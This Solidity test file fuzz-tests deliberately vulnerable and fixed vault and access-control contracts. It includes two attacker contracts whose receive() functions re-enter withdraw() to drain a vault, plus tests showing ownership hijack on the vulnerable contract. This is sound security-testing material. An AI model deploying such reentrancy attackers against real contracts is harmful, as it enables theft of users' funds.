// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../vulnerable/ReentrancyVulnerable.sol";
import "../secure/ReentrancyFixed.sol";
import "../vulnerable/AccessControlVulnerable.sol";
import "../secure/AccessControlFixed.sol";

contract AttackReentrant {
    ReentrancyVulnerable public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (attackCount < 3 && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw();
        }
    }
}

contract AttackSecureReentrant {
    ReentrancyFixed public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = ReentrancyFixed(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (attackCount < 3 && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw();
        }
    }
}

contract SecurityTest {
    ReentrancyVulnerable vulnVault;
    ReentrancyFixed secureVault;
    AccessControlVulnerable vulnAccess;
    AccessControlFixed secureAccess;

    function setUp() public {
        vulnVault = new ReentrancyVulnerable();
        secureVault = new ReentrancyFixed();
        vulnAccess = new AccessControlVulnerable();
        secureAccess = new AccessControlFixed();
    }

    // ==========================================
    // ACCESS CONTROL PROPERTY TESTS
    // ==========================================

    // Fuzz test property: Unauthorized caller invariant
    function testFuzz_AccessControl_UnauthorizedOwnerBypass(address caller, address attacker) public {
        if (caller == address(this) || attacker == address(0)) return;

        // On vulnerable contract, attacker can overwrite owner freely
        vulnAccess.setOwner(attacker);
        assert(vulnAccess.owner() == attacker);
    }

    // Fuzz test property: Secure contract rejects non-owner transfer
    function testFuzz_AccessControl_SecureOwnerProtection(address attacker) public {
        if (attacker == address(this) || attacker == address(0)) return;

        // In secure vault, attacker cannot hijack pendingOwner
        try secureAccess.acceptOwnership() {
            // Should fail because attacker is not pendingOwner
            assert(false);
        } catch {
            assert(true);
        }
    }

    // Fuzz invariant failure: Attacker can hijack ownership in vulnerable contract
    function testFuzz_AccessControl_Invariant_UnauthorizedCannotHijackOwner(address attacker) public {
        if (attacker == address(this) || attacker == address(0) || attacker == vulnAccess.owner()) return;

        vulnAccess.setOwner(attacker);
        // This invariant fails dynamically on vulnerable contract, proving exploitability!
        assert(vulnAccess.owner() != attacker);
    }

    // ==========================================
    // REENTRANCY PROPERTY TESTS
    // ==========================================

    // Fuzz invariant failure: Attacker can drain reentrant vault
    function testFuzz_Reentrancy_Invariant_VaultSolvencyPreserved(uint8 depositMultiplier) public {
        if (depositMultiplier == 0 || depositMultiplier > 5) return;

        // Seed vault with 10 ether
        vulnVault.deposit{value: 10 ether}();

        // Attacker attempts reentrancy
        AttackReentrant attacker = new AttackReentrant(address(vulnVault));
        attacker.attack{value: 1 ether}();

        // Invariant: The vault solvency must hold (attacker cannot extract more than deposited)
        // This invariant FAILS on vulnerable contract because attacker extracted 4 ether with 1 ether deposit!
        assert(address(attacker).balance <= 1 ether);
    }

    // Fuzz test property: Secure vault prevents reentrancy attack
    function testFuzz_Reentrancy_SecureGuardBlocksAttack(uint8 depositMultiplier) public {
        if (depositMultiplier == 0 || depositMultiplier > 5) return;

        // Seed secure vault with 10 ether
        secureVault.deposit{value: 10 ether}();

        // Attacker attempts reentrancy on secure vault
        AttackSecureReentrant attacker = new AttackSecureReentrant(address(secureVault));
        
        try attacker.attack{value: 1 ether}() {
            // If it didn't revert, verify attacker didn't steal extra funds
            assert(address(attacker).balance <= 1 ether);
        } catch {
            // Revert by nonReentrant guard is successful protection!
            assert(true);
        }
    }

    receive() external payable {}
}
